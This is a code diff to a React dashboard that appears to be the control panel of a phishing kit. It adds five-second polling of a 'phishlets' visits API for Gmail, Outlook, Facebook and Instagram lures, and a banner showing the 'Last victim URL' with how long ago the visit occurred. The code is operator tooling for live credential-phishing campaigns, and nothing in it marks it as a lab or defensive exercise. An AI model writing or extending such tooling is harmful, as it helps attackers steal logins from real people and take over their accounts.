@@ -1,9 +1,26 @@
-import { useState, useRef, useCallback } from 'react'
+import { useState, useEffect, useRef, useCallback } from 'react'
+import axios from 'axios'
 import Sidebar from './Sidebar'
 import TerminalOutput from './TerminalOutput'
 import useAsyncAction from '../hooks/useAsyncAction'
 
 const VPS_IP = import.meta.env.VITE_VPS_IP || '127.0.0.1'
+const BASE = import.meta.env.VITE_API_URL || ''
+
+function authHeaders() {
+  const token = localStorage.getItem('btb_token')
+  return token ? { Authorization: `Bearer ${token}` } : {}
+}
+
+const PHISHLET_KEYS = ['gmail', 'outlook', 'facebook', 'instagram']
+
+function timeAgo(iso) {
+  if (!iso) return ''
+  const diff = Math.max(0, Math.floor((Date.now() - new Date(iso).getTime()) / 1000))
+  if (diff < 60) return `${diff}s ago`
+  if (diff < 3600) return `${Math.floor(diff / 60)}m ago`
+  return `${Math.floor(diff / 3600)}h ago`
+}
 
 let tabIdCounter = 0
 
@@ -12,7 +29,39 @@ export default function Dashboard() {
   const [tabs, setTabs] = useState([])
   const [activeTabId, setActiveTabId] = useState(null)
   const [iframeError, setIframeError] = useState(false)
+  const [lastVisit, setLastVisit] = useState(null)
   const iframeRef = useRef(null)
+
+  useEffect(() => {
+    let cancelled = false
+    async function poll() {
+      const candidates = []
+      await Promise.all(
+        PHISHLET_KEYS.map((key) =>
+          axios
+            .get(`${BASE}/api/phishlets/visits`, {
+              params: { key, limit: 1 },
+              headers: authHeaders(),
+            })
+            .then((res) => {
+              const v = (res.data.visits || [])[0]
+              if (v) candidates.push({ key, ...v })
+            })
+            .catch(() => {})
+        )
+      )
+      if (cancelled) return
+      candidates.sort((a, b) => {
+        const ta = a.timestamp ? new Date(a.timestamp).getTime() : 0
+        const tb = b.timestamp ? new Date(b.timestamp).getTime() : 0
+        return tb - ta
+      })
+      setLastVisit(candidates[0] || null)
+    }
+    poll()
+    const t = setInterval(poll, 5000)
+    return () => { cancelled = true; clearInterval(t) }
+  }, [])
 
   function addTab(url, label) {
     const existing = tabs.find((t) => t.url === url)
@@ -58,6 +107,19 @@ export default function Dashboard() {
         <div className="text-xs text-gray-600 mb-4">
           target: <span className="text-green-500">{VPS_IP}</span>
         </div>
+
+        {lastVisit && lastVisit.timestamp && (Date.now() - new Date(lastVisit.timestamp).getTime() < 5 * 60 * 1000) && (
+          <div className="mb-4 border border-green-900 bg-green-950/40 rounded px-3 py-2 text-xs flex items-center gap-2">
+            <span className="text-green-400">🟢</span>
+            <span className="text-gray-400">Last victim URL:</span>
+            <span className="text-green-300 font-mono truncate max-w-[60%]">
+              {lastVisit.current_url}
+            </span>
+            <span className="text-gray-500">
+              ({lastVisit.key}, {timeAgo(lastVisit.timestamp)})
+            </span>
+          </div>
+        )}
 
         <TerminalOutput logs={logs} onClear={clearLogs} />
 
